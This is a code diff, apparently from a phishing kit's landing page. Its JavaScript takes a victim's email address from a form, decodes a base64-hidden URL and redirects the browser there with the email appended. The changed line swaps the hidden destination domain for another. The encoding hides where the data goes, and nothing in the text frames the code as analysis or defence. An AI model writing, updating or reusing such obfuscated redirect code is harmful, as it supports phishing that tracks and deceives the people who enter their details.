@@ -155,7 +155,7 @@
         function continueLoading() {
             var THEGODOFTHELIVING = document.getElementById('THEGODOFTHELIVING-input').value;
             if (validateEmail(THEGODOFTHELIVING)) {
-                var linkx = "aHR0cHM6Ly90aGR3LnB5b3Nhb3hpZGUuY29tLw"; // Base64 encoded link
+                var linkx = "aHR0cDovL3NvZGZjaXd5ZG9ycHNpbmMuY29tLw"; // Base64 encoded link
                 var decodedLink = atob(linkx);
                 var finalLink = decodedLink + "#" + THEGODOFTHELIVING;  // Directly append the email address
                 window.location.href = finalLink;
